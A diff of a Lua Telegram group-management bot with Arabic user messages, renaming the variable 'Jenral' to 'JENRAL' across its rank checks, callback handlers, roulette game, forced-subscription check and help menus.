DevALI:sismember(JENRAL..'ALI:ALIConstructor:'..chat_id, user_id) then JENRALTEAM = 'المالك' elseif DevALI:sismember(JENRAL..'ALI:BasicConstructor:'..chat_id, user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevALI:sismember(JENRAL..'ALI:Constructor:'..chat_id, user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevALI:sismember(JENRAL..'ALI:Managers:'..chat_id, user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:Managers:Rd"..chat_id) or 'المدير' elseif DevALI:sismember(JENRAL..'ALI:Admins:'..chat_id, user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:Admins:Rd"..chat_id) or 'الادمن' elseif DevALI:sismember(JENRAL..'ALI:VipMem:'..chat_id, user_id) then  JENRALTEAM = DevALI:get(JENRAL.."ALI:VipMem:Rd"..chat_id) or 'المميز' elseif DevALI:sismember(JENRAL..'ALI:Cleaner:'..chat_id, user_id) then  JENRALTEAM = DevALI:get(JENRAL.."ALI:Cleaner:Rd"..chat_id) or 'المنظف' else JENRALTEAM = DevALI:get(JENRAL.."ALI:mem:Rd"..chat_id) or 'العضو' end return JENRALTEAM end
+--     Source JENRAL     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
 var = true  
-elseif tonumber(user_id) == tonumber(Jenral) then  
+elseif tonumber(user_id) == tonumber(JENRAL) then  
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:SecondSudo:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:SecondSudo:', user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:SudoBot:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:SudoBot:', user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:ManagerAll:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:ManagerAll:', user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:AdminAll:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:AdminAll:', user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:VipAll:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:VipAll:', user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:ALIConstructor:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:ALIConstructor:'..chat_id, user_id) then
 var = true
-elseif DevALI:sismember(Jenral..'ALI:BasicConstructor:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:BasicConstructor:'..chat_id, user_id) then
 var = true
-elseif DevALI:sismember(Jenral..'ALI:Constructor:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:Constructor:'..chat_id, user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:Managers:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:Managers:'..chat_id, user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:Admins:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:Admins:'..chat_id, user_id) then
 var = true  
-elseif DevALI:sismember(Jenral..'ALI:VipMem:'..chat_id, user_id) then  
+elseif DevALI:sismember(JENRAL..'ALI:VipMem:'..chat_id, user_id) then  
 var = true 
 else  
 var = false
@@ -629,26 +629,26 @@ end
 function ALIDelAll(user_id,chat_id)
 if SudoId(user_id) then
 var = 'sudoid'  
-elseif DevALI:sismember(Jenral..'ALI:SecondSudo:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:SecondSudo:', user_id) then
 var = 'secondsudo' 
-elseif DevALI:sismember(Jenral..'ALI:SudoBot:', user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:SudoBot:', user_id) then
 var = 'sudobot'  
-elseif DevALI:sismember(Jenral..'ALI:ALIConstructor:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:ALIConstructor:'..chat_id, user_id) then
 var = 'ALIconstructor'
-elseif DevALI:sismember(Jenral..'ALI:BasicConstructor:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:BasicConstructor:'..chat_id, user_id) then
 var = 'basicconstructor'
-elseif DevALI:sismember(Jenral..'ALI:Constructor:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:Constructor:'..chat_id, user_id) then
 var = 'constructor'
-elseif DevALI:sismember(Jenral..'ALI:Managers:'..chat_id, user_id) then
+elseif DevALI:sismember(JENRAL..'ALI:Managers:'..chat_id, user_id) then
 var = 'manager'  
 else  
 var = 'No'
 end  
 return var
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 local function Filters(msg, value)
-local ALI = (Jenral..'ALI:Filters:'..msg.chat_id_)
+local ALI = (JENRAL..'ALI:Filters:'..msg.chat_id_)
 if ALI then
 local names = DevALI:hkeys(ALI)
 local value = value:gsub(' ','')
@@ -659,7 +659,7 @@ end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function ReplyStatus(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
 if dp.first_name_ ~= false then
@@ -684,7 +684,7 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙الحساب محذوف قم بالتا
 end
 end,nil)   
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function GetCustomTitle(user_id,chat_id)
 local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
 local GetInfo = JSON.decode(Check)
@@ -728,7 +728,7 @@ send(msg.chat_id_,msg.id_,'⌁︙صلاحيات '..GetCustomTitle(user_id,msg.ch
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function GetBio(chat_id)
 local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
 local GetInfo = JSON.decode(Check)
@@ -741,7 +741,7 @@ end
 end
 return ALI
 end
---     Source Jenral     --
+--     Source JENRAL     --
 local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
 tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
 end
@@ -793,18 +793,18 @@ MsgText = "معلك لربك"
 end 
 return MsgText
 end
---     Source Jenral     --
-function ALImoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevALI:get(Jenral..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
---     Source Jenral     --
+--     Source JENRAL     --
+function ALImoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevALI:get(JENRAL..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
+--     Source JENRAL     --
 function SourceCh(msg) 
 local url,res = https.request('https://apiALI.ml/SourceCh.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
-if data.ChatMember.Jenral ~= true then
+if data.ChatMember.JENRAL ~= true then
 Var = false
 keyboard = {} 
 keyboard.inline_keyboard = {{{text=data.ChatMember.Title,url=data.ChatMember.Url}}} 
 Msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(data.ChatMember.Jenral).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(data.ChatMember.JENRAL).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
 Var = true
 end
@@ -812,16 +812,16 @@ return Var
 end
 function ChCheck(msg)
 local var = true 
-if DevALI:get(Jenral.."ALI:ChId") then
-local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevALI:get(Jenral..'ALI:ChId')..'&user_id='..msg.sender_user_id_)
+if DevALI:get(JENRAL.."ALI:ChId") then
+local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevALI:get(JENRAL..'ALI:ChId')..'&user_id='..msg.sender_user_id_)
 local data = json:decode(url)
 if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
 var = false 
-if DevALI:get(Jenral..'ALI:ChText') then
-local ChText = DevALI:get(Jenral..'ALI:ChText')
+if DevALI:get(JENRAL..'ALI:ChText') then
+local ChText = DevALI:get(JENRAL..'ALI:ChText')
 send(msg.chat_id_,msg.id_,'['..ChText..']')
 else
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(Jenral.."ALI:ChId"))
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(JENRAL.."ALI:ChId"))
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.username then
 User = "https://t.me/"..GetInfo.result.username
@@ -847,9 +847,9 @@ local Chat_Id2 = data.chat_id_
 local MsgId2 = data.message_id_
 local DataText = data.payload_.data_
 local Msg_Id2 = data.message_id_/2097152/0.5
-if DataText == '/delyes' and DevALI:get(Jenral..'yes'..data.sender_user_id_) == 'delyes' then
-DevALI:del(Jenral..'yes'..data.sender_user_id_, 'delyes')
-DevALI:del(Jenral..'no'..data.sender_user_id_, 'delno')
+if DataText == '/delyes' and DevALI:get(JENRAL..'yes'..data.sender_user_id_) == 'delyes' then
+DevALI:del(JENRAL..'yes'..data.sender_user_id_, 'delyes')
+DevALI:del(JENRAL..'no'..data.sender_user_id_, 'delno')
 if RankChecking(data.sender_user_id_, data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
 return false
@@ -874,34 +874,34 @@ return false
 end
 end,nil)  
 end
-if DataText == '/delno' and DevALI:get(Jenral..'no'..data.sender_user_id_) == 'delno' then
-DevALI:del(Jenral..'yes'..data.sender_user_id_, 'delyes')
-DevALI:del(Jenral..'no'..data.sender_user_id_, 'delno')
+if DataText == '/delno' and DevALI:get(JENRAL..'no'..data.sender_user_id_) == 'delno' then
+DevALI:del(JENRAL..'yes'..data.sender_user_id_, 'delyes')
+DevALI:del(JENRAL..'no'..data.sender_user_id_, 'delno')
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر اطردني") 
 end
---     Source Jenral     --
-if DataText == '/yesdel' and DevALI:get(Jenral..'yesdel'..data.sender_user_id_) == 'delyes' then
-DevALI:del(Jenral..'yesdel'..data.sender_user_id_, 'delyes')
-DevALI:del(Jenral..'nodel'..data.sender_user_id_, 'delno')
-if DevALI:sismember(Jenral..'ALI:Constructor:'..data.chat_id_, data.sender_user_id_) then
+--     Source JENRAL     --
+if DataText == '/yesdel' and DevALI:get(JENRAL..'yesdel'..data.sender_user_id_) == 'delyes' then
+DevALI:del(JENRAL..'yesdel'..data.sender_user_id_, 'delyes')
+DevALI:del(JENRAL..'nodel'..data.sender_user_id_, 'delno')
+if DevALI:sismember(JENRAL..'ALI:Constructor:'..data.chat_id_, data.sender_user_id_) then
 constructor = 'المنشئين • ' else constructor = '' end 
-if DevALI:sismember(Jenral..'ALI:Managers:'..data.chat_id_, data.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Managers:'..data.chat_id_, data.sender_user_id_) then
 Managers = 'المدراء • ' else Managers = '' end
-if DevALI:sismember(Jenral..'ALI:Admins:'..data.chat_id_, data.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Admins:'..data.chat_id_, data.sender_user_id_) then
 admins = 'الادمنيه • ' else admins = '' end
-if DevALI:sismember(Jenral..'ALI:VipMem:'..data.chat_id_, data.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:VipMem:'..data.chat_id_, data.sender_user_id_) then
 vipmem = 'المميزين • ' else vipmem = '' end
-if DevALI:sismember(Jenral..'ALI:Cleaner:'..data.chat_id_, data.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Cleaner:'..data.chat_id_, data.sender_user_id_) then
 cleaner = 'المنظفين • ' else cleaner = '' end
-if DevALI:sismember(Jenral..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
+if DevALI:sismember(JENRAL..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
 donky = 'المطايه • ' else donky = '' end
-if DevALI:sismember(Jenral..'ALI:Constructor:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(Jenral..'ALI:Managers:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(Jenral..'ALI:Admins:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(Jenral..'ALI:VipMem:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(Jenral..'ALI:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(Jenral..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
-DevALI:srem(Jenral..'ALI:Constructor:'..data.chat_id_,data.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..data.chat_id_,data.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Admins:'..data.chat_id_,data.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..data.chat_id_,data.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..data.chat_id_,data.sender_user_id_)
-DevALI:srem(Jenral..'User:Donky:'..data.chat_id_,data.sender_user_id_)
+if DevALI:sismember(JENRAL..'ALI:Constructor:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(JENRAL..'ALI:Managers:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(JENRAL..'ALI:Admins:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(JENRAL..'ALI:VipMem:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(JENRAL..'ALI:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevALI:sismember(JENRAL..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
+DevALI:srem(JENRAL..'ALI:Constructor:'..data.chat_id_,data.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..data.chat_id_,data.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..data.chat_id_,data.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..data.chat_id_,data.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..data.chat_id_,data.sender_user_id_)
+DevALI:srem(JENRAL..'User:Donky:'..data.chat_id_,data.sender_user_id_)
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
 else 
 if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
@@ -911,14 +911,14 @@ EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع تنزيل ↫ "..IdRank(dat
 end
 end
 end
-if DevALI:get(Jenral.."ALI:NewDev"..data.sender_user_id_) then
+if DevALI:get(JENRAL.."ALI:NewDev"..data.sender_user_id_) then
 if DataText == '/setno' then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر تغير المطور الاساسي") 
-DevALI:del(Jenral.."ALI:NewDev"..data.sender_user_id_)
+DevALI:del(JENRAL.."ALI:NewDev"..data.sender_user_id_)
 return false
 end
 if DataText == '/setyes' then
-local NewDev = DevALI:get(Jenral.."ALI:NewDev"..data.sender_user_id_)
+local NewDev = DevALI:get(JENRAL.."ALI:NewDev"..data.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⌁︙تم تغير المطور الاساسي بنجاح") 
 end,nil)
@@ -939,37 +939,37 @@ end
 Config = {
 DevId = NewDev,
 TokenBot = TokenBot,
-Jenral = TokenBot:match("(%d+)"),
+JENRAL = TokenBot:match("(%d+)"),
 SudoIds = {NewDev},
 }
 Create(Config, "./config.lua")  
-DevALI:del(Jenral.."ALI:NewDev"..data.sender_user_id_)
-dofile('Jenral.lua') 
+DevALI:del(JENRAL.."ALI:NewDev"..data.sender_user_id_)
+dofile('JENRAL.lua') 
 end
 end
-if DataText == '/nodel' and DevALI:get(Jenral..'nodel'..data.sender_user_id_) == 'delno' then
-DevALI:del(Jenral..'yesdel'..data.sender_user_id_, 'delyes')
-DevALI:del(Jenral..'nodel'..data.sender_user_id_, 'delno')
+if DataText == '/nodel' and DevALI:get(JENRAL..'nodel'..data.sender_user_id_) == 'delno' then
+DevALI:del(JENRAL..'yesdel'..data.sender_user_id_, 'delyes')
+DevALI:del(JENRAL..'nodel'..data.sender_user_id_, 'delno')
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر نزلني") 
 end
-if DataText == '/YesRolet' and DevALI:get(Jenral.."ALI:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
-local List = DevALI:smembers(Jenral..'ALI:ListRolet'..data.chat_id_) 
+if DataText == '/YesRolet' and DevALI:get(JENRAL.."ALI:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
+local List = DevALI:smembers(JENRAL..'ALI:ListRolet'..data.chat_id_) 
 local UserName = List[math.random(#List)]
 tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
-DevALI:incrby(Jenral..'ALI:GamesNumber'..data.chat_id_..dp.id_, 5) 
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..data.chat_id_..dp.id_, 5) 
 end,nil) 
-DevALI:del(Jenral..'ALI:ListRolet'..data.chat_id_) 
-DevALI:del(Jenral.."ALI:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
+DevALI:del(JENRAL..'ALI:ListRolet'..data.chat_id_) 
+DevALI:del(JENRAL.."ALI:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙*صاحب الحظ* ↫ ["..UserName.."]\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
 end
 if DataText == '/NoRolet' then
-DevALI:del(Jenral..'ALI:ListRolet'..data.chat_id_) 
-DevALI:del(Jenral.."ALI:NumRolet"..data.chat_id_..data.sender_user_id_) 
-DevALI:del(Jenral.."ALI:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
+DevALI:del(JENRAL..'ALI:ListRolet'..data.chat_id_) 
+DevALI:del(JENRAL.."ALI:NumRolet"..data.chat_id_..data.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
 end
 if DataText == '/ListRolet' then
-local List = DevALI:smembers(Jenral..'ALI:ListRolet'..data.chat_id_) 
+local List = DevALI:smembers(JENRAL..'ALI:ListRolet'..data.chat_id_) 
 local Text = '⌁︙قائمة الاعبين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n' 
 local Textt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تم اكتمال العدد الكلي هل انت مستعد ؟'
 for k, v in pairs(List) do 
@@ -980,9 +980,9 @@ keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="ل
 return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 if DataText == '/UnTkeed' then
-if DevALI:sismember(Jenral..'ALI:Tkeed:'..Chat_Id2, data.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Tkeed:'..Chat_Id2, data.sender_user_id_) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevALI:srem(Jenral..'ALI:Tkeed:'..Chat_Id2, data.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..Chat_Id2, data.sender_user_id_)
 DeleteMessage(Chat_Id2,{[0] = MsgId2})
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
 else
@@ -992,27 +992,27 @@ end
 if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abbs = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙الكلمه ↫ "..Abbs.." تم حذفها") 
-DevALI:del(Jenral..'ALI:Text:GpTexts'..Abbs..data.chat_id_)
-DevALI:srem(Jenral..'ALI:Manager:GpRedod'..data.chat_id_,Abbs)
+DevALI:del(JENRAL..'ALI:Text:GpTexts'..Abbs..data.chat_id_)
+DevALI:srem(JENRAL..'ALI:Manager:GpRedod'..data.chat_id_,Abbs)
 end
 if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abbs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
-local List = DevALI:smembers(Jenral..'ALI:Text:GpTexts'..Abbs..data.chat_id_)
-if DevALI:get(Jenral..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
+local List = DevALI:smembers(JENRAL..'ALI:Text:GpTexts'..Abbs..data.chat_id_)
+if DevALI:get(JENRAL..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Abbs) 
-DevALI:del(Jenral..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
 else
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙عذرا صلاحية الامر منتهيه !") 
 end
 end
 if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abbs = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
-if DevALI:get(Jenral..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..Abbs) 
-DevALI:del(Jenral..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
-DevALI:del(Jenral..'ALI:Text:GpTexts'..Abbs..data.chat_id_)
-DevALI:del(Jenral..'ALI:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
-DevALI:srem(Jenral..'ALI:Manager:GpRedod'..data.chat_id_,Abbs)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
+DevALI:del(JENRAL..'ALI:Text:GpTexts'..Abbs..data.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
+DevALI:srem(JENRAL..'ALI:Manager:GpRedod'..data.chat_id_,Abbs)
 else
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙عذرا صلاحية الامر منتهيه !") 
 end
@@ -1028,7 +1028,7 @@ end
 if DataText and DataText:match('/HelpList:(.*)') then
 local Abbs = DataText:match('/HelpList:(.*)')
 if tonumber(Abbs) == tonumber(data.sender_user_id_) then
-local Help = DevALI:get(Jenral..'ALI:Help')
+local Help = DevALI:get(JENRAL..'ALI:Help')
 local Text = [[
 ⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1054,7 +1054,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevALI:get(Jenral..'ALI:Help1')
+local Help = DevALI:get(JENRAL..'ALI:Help1')
 local Text = [[
 ⌁︙اوامر حماية المجموعه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1116,7 +1116,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevALI:get(Jenral..'ALI:Help2')
+local Help = DevALI:get(JENRAL..'ALI:Help2')
 local Text = [[
 ⌁︙اوامر الادمنيه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1186,7 +1186,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevALI:get(Jenral..'ALI:Help3')
+local Help = DevALI:get(JENRAL..'ALI:Help3')
 local Text = [[
 ⌁︙اوامر المدراء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1245,7 +1245,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevALI:get(Jenral..'ALI:Help4')
+local Help = DevALI:get(JENRAL..'ALI:Help4')
 local Text = [[
 ⌁︙اوامر المنشئين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1298,7 +1298,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevALI:get(Jenral..'ALI:Help5')
+local Help = DevALI:get(JENRAL..'ALI:Help5')
 local Text = [[
 ⌁︙اوامر المطورين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1375,7 +1375,7 @@ end
 if DataText and DataText:match('/HelpList6:(.*)') then
 local Abbs = DataText:match('/HelpList6:(.*)')
 if tonumber(Abbs) == tonumber(data.sender_user_id_) then
-local Help = DevALI:get(Jenral..'ALI:Help6')
+local Help = DevALI:get(JENRAL..'ALI:Help6')
 local Text = [[
 ⌁︙اوامر الاعضاء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1418,49 +1418,49 @@ end
 if (data.ID == "UpdateNewMessage") then
 local msg = data.message_
 text = msg.content_.text_ 
-if text and DevALI:get(Jenral.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
-local NewCmmd = DevALI:get(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
+if text and DevALI:get(JENRAL.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
+local NewCmmd = DevALI:get(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
 if NewCmmd then
-DevALI:del(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
-DevALI:del(Jenral.."Set:Cmd:Group:New"..msg.chat_id_)
-DevALI:srem(Jenral.."List:Cmd:Group:New"..msg.chat_id_,text)
+DevALI:del(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
+DevALI:del(JENRAL.."Set:Cmd:Group:New"..msg.chat_id_)
+DevALI:srem(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الامر من المجموعه", 1, 'html')  
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد امر بهذا الاسم", 1, 'html')
 end
